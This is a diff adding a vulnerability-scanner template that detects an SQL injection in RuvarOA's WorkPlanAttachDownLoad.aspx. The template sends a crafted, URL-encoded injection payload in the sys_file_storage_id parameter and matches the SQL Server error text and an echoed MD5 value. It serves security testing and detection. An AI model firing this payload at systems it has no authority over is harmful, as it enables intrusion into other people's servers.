@@ -1,0 +1,27 @@
+id: ruvaroa-workplanattachdownload-sqli
+info:
+  name: RuvarOA WorkPlanAttachDownLoad.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in RuvarOA's WorkPlanAttachDownLoad.aspx endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27%20and%20%28sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))%29%3E0%29--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "{{t2}}"
